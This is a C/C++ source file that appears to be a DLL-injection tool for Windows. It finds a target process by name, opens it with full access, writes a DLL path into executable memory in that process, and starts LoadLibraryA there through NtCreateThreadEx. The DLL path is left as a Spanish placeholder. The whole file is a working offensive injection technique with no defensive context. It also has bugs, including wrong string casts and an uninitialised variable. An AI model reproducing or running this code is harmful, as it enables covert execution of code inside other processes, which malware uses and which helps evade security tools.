#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>

#pragma comment(lib, "advapi32.lib")

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)
(
	OUT PHANDLE			hThread,
	IN  ACCESS_MASK		DesiredAccess,
	IN  PVOID			ObjectAttributes, 
	IN  PVOID			ProcessHandle, 
	IN  PVOID			lpStartAddress,
	IN  PVOID			lpParameter, 
	IN	ULONG			Flags, 
	IN  SIZE_T			StackZeroBits, 
	IN  SIZE_T			SizeOfStackCommit, 
	IN  SIZE_T			SizeOfStackReserve,
	OUT PVOID			lpBytesBuffer 
);

int findMyProc(const char* procname)
{
	HANDLE			hSnapshot; 
	PROCESSENTRY32	pe;
	int				pid = 0;
	BOOL			hResult;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	pe.dwSize = sizeof(PROCESSENTRY32);
	hResult   = Process32First(hSnapshot, &pe);

	while (hResult)
	{
		if (strcmp(procname, (const char*)pe.szExeFile) == 0)
		{
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}
	CloseHandle(hSnapshot);
	return pid;
}

int main(int argc, char* argv[])
{
	DWORD	pid = 0;
	HANDLE	ph;
	HANDLE  ht;
	LPVOID  rb;
	SIZE_T  rl;

	char DLL[] = "RUTA DE LA DLL";
	int  len   = sizeof(DLL);

	HMODULE hKernel32 = GetModuleHandle((LPCWSTR)"Kernel32");
	LPTHREAD_START_ROUTINE lb = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
	pNtCreateThreadEx ntCTEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandle((LPCWSTR)"ntdll.dll"), "NtCreateThreadEx");

	if (ntCTEx == NULL)
	{
		CloseHandle(ph);
		printf("NtCreateThreadEx failed :( exiting... \n");
		return -2;
	}
	pid = findMyProc(argv[1]);
	if (pid == 0)
	{
		printf("PID not found :( exiting...\n");
		return -1;
	}
	else
	{
		printf("PID = %d\n", pid);
		ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
		if (ph == NULL)
		{
			printf("OpenProcess failed :( exiting... \n");
			return -2;
		}
		rb = VirtualAllocEx(ph, NULL, len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		WriteProcessMemory(ph, rb, DLL, len, (SIZE_T*)rl);
		
		ntCTEx(&ht, 0x1FFFFF, NULL, ph, (LPTHREAD_START_ROUTINE)lb, rb, FALSE, NULL, NULL, NULL, NULL);
		if (ht == NULL)
		{
			CloseHandle(ph);
			printf("ThreadHandle failed :( exiting... \n");
			return -2;
		}
		else
		{
			printf("Successfully inject via NtCreateThreadEx :) \n");
		}

		WaitForSingleObject(ht, INFINITE);
		CloseHandle(ht);
		CloseHandle(ph);
	}
	return 0;
}
